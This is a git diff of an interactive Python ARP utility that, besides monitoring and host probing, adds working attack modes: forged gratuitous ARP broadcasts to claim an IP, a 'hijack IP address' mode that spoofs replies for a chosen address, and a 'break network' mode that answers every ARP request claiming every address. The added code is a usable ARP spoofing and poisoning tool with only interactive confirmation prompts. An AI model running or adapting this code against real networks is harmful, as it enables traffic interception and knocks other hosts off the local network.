@@ -15,9 +15,9 @@ import random
 
 from logging import warn
 from functools import partial
-from typing import Callable
-from utils import confirm_network_transmit, determine_ip_version, generate_random_mac_address, get_interface_mac_address, ipv4_bytes_to_str, ipv6_bytes_to_str, mac_bytes_to_str, mac_str_to_bytes, make_progress_bar, print_table, prompt_menu
+from utils import *
 
+# Parse an ARP frame (bytes) into variables
 def parse_arp_frame(frame: bytes):
     stream = io.BytesIO(frame)
 
@@ -77,6 +77,7 @@ def parse_arp_frame(frame: bytes):
     return ETH_DEST_MAC, ETH_SRC_MAC, ETH_TYPE, ARP_HTYPE, ARP_PTYPE, ARP_HLEN, ARP_PLEN, ARP_OPER, IP_PRO_VER, IP_ADDR_LEN, ARP_SHA_MAC_ADDR, ARP_SPA_PRO_ADDR, ARP_THA_MAC_ADDR, ARP_TPA_PRO_ADDR
 
 
+# Monitor for ARP messages - do not transmit!
 def monitor(interface: str):
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
     sock.bind((interface, 0))
@@ -146,11 +147,11 @@ def transmit_arp_request_ipv4(interface: str, target_ip: str, source_mac: str, s
     TPA = ipaddress.IPv4Address(target_ip).packed # The target's IPv4 address
 
     arp_payload = SHA + SPA + THA + TPA
-    frame = eth_header + arp_header + arp_payload
-    sock.send(frame)
+    sock.send(build_eth_frame(eth_header, arp_header + arp_payload))
     sock.close()
 
 
+# Listens on a socket to detect ARP replies
 def listen_for_arp_reply_ipv4(interface: str, target_mac: str):
     responses: list[tuple[str, str]] = []
     should_stop = threading.Event()
@@ -191,11 +192,12 @@ def listen_for_arp_reply_ipv4(interface: str, target_mac: str):
         thr.join()
         return responses
 
-    return thr, stop
+    return thr, stop, responses
 
 
+# Find live hosts - either a single address or an address range
 def probe(interface: str):
-    range = input('Enter a range of hosts to probe or an IP address: ')
+    range = input('Enter an IP address or range (slash notation) to probe: ')
 
     try:
         ip_version = determine_ip_version(range.split('/')[0])
@@ -215,10 +217,9 @@ def probe(interface: str):
     tx_mac_address = input(f'Enter a MAC address to transmit from (or "random" to create one) [{default_mac_address}]: ').lower() or default_mac_address
 
     if tx_mac_address == 'random':
-        tx_mac_address = generate_random_mac_address()
+        tx_mac_address = generate_random_mac_address(interface)
         print(F'Using a random MAC address: {tx_mac_address}')
-        
-    
+
     should_randomize = (input('Should I shuffle the hosts in this network? [Y/n]: ').lower() or 'y') == 'y'
 
     hosts = list(network.hosts())
@@ -232,7 +233,7 @@ def probe(interface: str):
         return main()
     
     start_time = time.time()
-    listen_thr, listen_stop = listen_for_arp_reply_ipv4(interface, tx_mac_address)
+    listen_thr, listen_stop, responses = listen_for_arp_reply_ipv4(interface, tx_mac_address)
 
     try:
         print(f'\nARP probing has begun. Sending requests to {len(hosts)} hosts...\nThis may take a while. Press Ctrl+C to stop.\n')
@@ -246,10 +247,14 @@ def probe(interface: str):
                 print(make_progress_bar(f'Transmitting: {host} ({hosts.index(host) + 1} / {len(hosts)})      ', hosts.index(host) + 1, len(hosts)), end='\r')
                 time.sleep(wait_time)
         
+        waiting_since_time = time.time()
+
         if len(hosts) > 1:
             print('\nWaiting for responses...\n')
+        
+        while len(responses) < len(hosts) and time.time() - waiting_since_time < timeout:
+            continue # Wait for either: (a) all hosts to respond, or (b) the timeout to expire
 
-        time.sleep(timeout)
         responses = listen_stop()
 
         print(f'\nSeen {len(responses)} hosts in {round(time.time() - start_time)} seconds.\n')
@@ -264,6 +269,146 @@ def probe(interface: str):
         raise KeyboardInterrupt
 
 
+# Build and transmit an ARP reply
+def transmit_arp_reply_ipv4(interface: str, target_mac: str, target_ip: str, source_mac: str, source_ip: str):
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    sock.bind((interface, 0))
+
+    # Ethernet header
+    eth_header = mac_str_to_bytes(target_mac) + mac_str_to_bytes(source_mac) + bytes.fromhex('0806')
+
+    # ARP header
+    HTYPE = bytes.fromhex('0001') # Using Ethernet
+    PTYPE = bytes.fromhex('0800') # Using IPv4
+    HLEN = bytes.fromhex('06') # MAC address length
+    PLEN = bytes.fromhex('04') # IPv4 address length
+    OPER = bytes.fromhex('0002') # We are sending an ARP reply
+    arp_header = HTYPE + PTYPE + HLEN + PLEN + OPER
+
+    # Sender addresses
+    SHA = mac_str_to_bytes(source_mac) # Our MAC address
+    SPA = ipaddress.IPv4Address(source_ip).packed # Our IPv4 address
+
+    # Target addresses
+    THA = mac_str_to_bytes(target_mac) # We know the target's MAC address
+    TPA = ipaddress.IPv4Address(target_ip).packed # The target's IPv4 address
+
+    arp_payload = SHA + SPA + THA + TPA
+    sock.send(build_eth_frame(eth_header, arp_header + arp_payload))
+    sock.close()
+
+
+# Use a GARP announcement to claim ownership of an IP address
+def gracious_arp_broadcast(interface: str):
+    target_ip = input('Enter an IP address to claim ownership of: ')
+
+    default_mac_address = get_interface_mac_address(interface)
+    tx_mac_address = input(f'Enter a MAC address to transmit from (or "random" to create one) [{default_mac_address}]: ').lower() or default_mac_address
+
+    if tx_mac_address == 'random':
+        tx_mac_address = generate_random_mac_address(interface)
+        print(F'Using a random MAC address: {tx_mac_address}')
+    
+    if not confirm_network_transmit():
+        return main()
+
+    def run():
+        print(f'''
+Transmitting a Gracious ARP broadcast:
+"{target_ip} is now available at {tx_mac_address}"
+    ''')
+
+        transmit_arp_reply_ipv4(interface, 'ff:ff:ff:ff:ff:ff', target_ip, tx_mac_address, target_ip)
+
+        should_run_again = (input('Should I make another broadcast with the same details? [Y/n]: ').lower() or 'y') == 'y'
+        if should_run_again:
+            run()
+        else:
+            main()
+    
+
+    run()
+
+
+# Reply to ALL ARP requests stating we are the owner of the IP address
+def break_network_reply_all(interface: str):
+    default_mac_address = get_interface_mac_address(interface)
+    tx_mac_address = input(f'Enter a MAC address to transmit from (or "random" to create one) [{default_mac_address}]: ').lower() or default_mac_address
+
+    if tx_mac_address == 'random':
+        tx_mac_address = generate_random_mac_address(interface)
+        print(F'Using a random MAC address: {tx_mac_address}')
+    
+    if input('This will likely break the network by responding to ALL requests with a reply stating this device is the owner of every IP address. Are you sure? [y/N]: ').lower() != 'y':
+        return main()
+
+    if not confirm_network_transmit():
+        return main()
+    
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    sock.bind((interface, 0))
+    print('Listening for ARP frames...')
+    
+    while True:
+        frame = sock.recv(65535)
+        try:
+            ETH_DEST_MAC, ETH_SRC_MAC, ETH_TYPE, ARP_HTYPE, ARP_PTYPE, ARP_HLEN, ARP_PLEN, ARP_OPER, IP_PRO_VER, IP_ADDR_LEN, ARP_SHA_MAC_ADDR, ARP_SPA_PRO_ADDR, ARP_THA_MAC_ADDR, ARP_TPA_PRO_ADDR = parse_arp_frame(frame)
+        except ValueError:
+            continue
+
+        match ARP_OPER:
+            case 1:
+                print(f'[REQUEST] {ETH_SRC_MAC} -> {ETH_DEST_MAC} : who is {ARP_TPA_PRO_ADDR} (IPv{IP_PRO_VER})?')
+                transmit_arp_reply_ipv4(interface, ETH_SRC_MAC, ARP_TPA_PRO_ADDR, tx_mac_address, ARP_TPA_PRO_ADDR)
+                print(f'[INJECT]  {tx_mac_address} -> {ETH_SRC_MAC} : {ARP_TPA_PRO_ADDR} is {tx_mac_address} (IPv{IP_PRO_VER})')
+            case 2:
+                print(f'[REPLY]   {ETH_SRC_MAC} -> {ETH_DEST_MAC} : {ARP_SPA_PRO_ADDR} is {ARP_SHA_MAC_ADDR} (IPv{IP_PRO_VER})')
+            case _:
+                continue
+
+
+def hijack_ip_addr(interface: str):
+    ip_addr = input('Enter an IP address to hijack: ')
+
+    default_mac_address = get_interface_mac_address(interface)
+    tx_mac_address = input(f'Enter a MAC address to transmit from (or "random" to create one) [{default_mac_address}]: ').lower() or default_mac_address
+
+    should_make_announcement = (input(f'Should I make a GARP broadcast claiming {ip_addr} is now me? [Y/n]: ').lower() or 'y') == 'y'
+
+    if (input(f'This may break the network by incorrectly replying to ARP requests. This device will claim to own {ip_addr}. Are you sure? [Y/n]: ').lower() or 'y') != 'y':
+        return main()
+
+    if not confirm_network_transmit():
+        return main()
+    
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    sock.bind((interface, 0))
+    print('Listening for ARP frames...')
+
+    if should_make_announcement:
+        # Make the GARP broadcast
+        transmit_arp_reply_ipv4(interface, 'ff:ff:ff:ff:ff:ff', ip_addr, tx_mac_address, ip_addr)
+        print(F'[BRDCST]  {tx_mac_address} -> ff:ff:ff:ff:ff:ff : {ip_addr} is {tx_mac_address} (IPv4)')
+    
+    while True:
+        frame = sock.recv(65535)
+        try:
+            ETH_DEST_MAC, ETH_SRC_MAC, ETH_TYPE, ARP_HTYPE, ARP_PTYPE, ARP_HLEN, ARP_PLEN, ARP_OPER, IP_PRO_VER, IP_ADDR_LEN, ARP_SHA_MAC_ADDR, ARP_SPA_PRO_ADDR, ARP_THA_MAC_ADDR, ARP_TPA_PRO_ADDR = parse_arp_frame(frame)
+        except ValueError:
+            continue
+
+        match ARP_OPER:
+            case 1:
+                print(f'[REQUEST] {ETH_SRC_MAC} -> {ETH_DEST_MAC} : who is {ARP_TPA_PRO_ADDR} (IPv{IP_PRO_VER})?')
+                if ARP_TPA_PRO_ADDR == ip_addr:
+                    transmit_arp_reply_ipv4(interface, ETH_SRC_MAC, ARP_TPA_PRO_ADDR, tx_mac_address, ARP_TPA_PRO_ADDR)
+                    print(f'[INJECT]  {tx_mac_address} -> {ETH_SRC_MAC} : {ARP_TPA_PRO_ADDR} is {tx_mac_address} (IPv{IP_PRO_VER})')
+            case 2:
+                print(f'[REPLY]   {ETH_SRC_MAC} -> {ETH_DEST_MAC} : {ARP_SPA_PRO_ADDR} is {ARP_SHA_MAC_ADDR} (IPv{IP_PRO_VER})')
+            case _:
+                continue
+
+
 def main(interface = None):
     if not interface:
         interface = input('Enter an interface [eth0]: ').lower() or 'eth0'
@@ -271,7 +416,12 @@ def main(interface = None):
     try:
         prompt_menu('ARP Menu', [
             ('Listen for frames - do not TX', partial(monitor, interface)),
-            ('Probe host or range', partial(probe, interface)),
+            ('Probe host or range - find live hosts', partial(probe, interface)),
+            ('GARP announcement - announce an IP + MAC pair', partial(gracious_arp_broadcast, interface)),
+            ('Hijack IP address - spoof ARP replies', partial(hijack_ip_addr, interface)),
+            ('Break network - reply to all requests', partial(break_network_reply_all, interface))
         ])
     except KeyboardInterrupt:
         main(interface)
+    
+    main(interface)
